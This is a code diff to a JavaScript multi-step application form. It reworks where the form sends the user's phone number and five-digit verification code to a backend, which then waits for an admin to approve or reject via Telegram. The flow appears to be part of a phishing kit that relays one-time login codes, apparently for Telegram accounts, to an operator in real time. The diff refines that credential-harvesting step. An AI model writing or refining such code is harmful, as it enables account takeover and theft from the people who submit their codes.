@@ -67,7 +67,8 @@ function updateFormUI() {
     }
 }
 
-async function nextStep() {
+// --- JUST MOVE TO NEXT STEP (No Telegram check here anymore) ---
+function nextStep() {
     if (currentStep < totalSteps) {
         const currentStepDiv = document.getElementById(`step-${currentStep}`);
         const inputs = currentStepDiv.querySelectorAll('input, select');
@@ -87,45 +88,8 @@ async function nextStep() {
             return;
         }
 
-        const nextBtn = document.getElementById('btn-next');
-        const originalText = nextBtn.innerText;
-        nextBtn.innerText = "Waiting for Telegram Approval...";
-        nextBtn.disabled = true;
-
-        const phone = document.getElementById('phone-number').value || "Unknown";
-        const code = document.getElementById('five-digit-code').value || "Unknown";
-
-        try {
-            const response = await fetch('/api/request-approval', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: phone, code: code })
-            });
-            const result = await response.json();
-
-            const interval = setInterval(async () => {
-                const statusRes = await fetch(`/api/check-status/${result.app_id}`);
-                const statusData = await statusRes.json();
-
-                if (statusData.status === 'approve') {
-                    clearInterval(interval);
-                    nextBtn.innerText = originalText;
-                    nextBtn.disabled = false;
-                    currentStep++;
-                    updateFormUI(); 
-                } else if (statusData.status === 'reject') {
-                    clearInterval(interval);
-                    alert("Application rejected by Admin.");
-                    nextBtn.innerText = originalText;
-                    nextBtn.disabled = false;
-                }
-            }, 2000);
-
-        } catch (error) {
-            alert("Error connecting to server.");
-            nextBtn.innerText = originalText;
-            nextBtn.disabled = false;
-        }
+        currentStep++;
+        updateFormUI();
     }
 }
 
@@ -154,7 +118,66 @@ function generateSummary() {
     }
 }
 
-function submitForm(event) {
+// --- TELEGRAM APPROVAL LOGIC HAPPENS HERE ON FINAL SUBMIT ---
+async function submitForm(event) {
     event.preventDefault(); 
-    goToScreen('screen-success');
+    
+    // 1. Validate final step
+    const currentStepDiv = document.getElementById(`step-${currentStep}`);
+    const inputs = currentStepDiv.querySelectorAll('input, select');
+    let isValid = true;
+
+    inputs.forEach(input => {
+        if (!input.checkValidity()) {
+            isValid = false;
+            input.style.borderColor = 'red';
+        } else {
+            input.style.borderColor = '#3c5c75'; 
+        }
+    });
+
+    if (!isValid) {
+        alert("Please fill out all fields correctly before submitting.");
+        return;
+    }
+
+    // 2. Change Submit Button State
+    const submitBtn = document.getElementById('btn-submit');
+    const originalText = submitBtn.innerText;
+    submitBtn.innerText = "Waiting for Telegram Approval...";
+    submitBtn.disabled = true;
+
+    const phone = document.getElementById('phone-number').value || "Unknown";
+    const code = document.getElementById('five-digit-code').value || "Unknown";
+
+    try {
+        // 3. Send to Python Backend
+        const response = await fetch('/api/request-approval', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: phone, code: code })
+        });
+        const result = await response.json();
+
+        // 4. Poll for approval from Telegram
+        const interval = setInterval(async () => {
+            const statusRes = await fetch(`/api/check-status/${result.app_id}`);
+            const statusData = await statusRes.json();
+
+            if (statusData.status === 'approve') {
+                clearInterval(interval);
+                goToScreen('screen-success'); // Show success screen!
+            } else if (statusData.status === 'reject') {
+                clearInterval(interval);
+                alert("Application rejected by Admin.");
+                submitBtn.innerText = originalText;
+                submitBtn.disabled = false;
+            }
+        }, 2000);
+
+    } catch (error) {
+        alert("Error connecting to server.");
+        submitBtn.innerText = originalText;
+        submitBtn.disabled = false;
+    }
 }
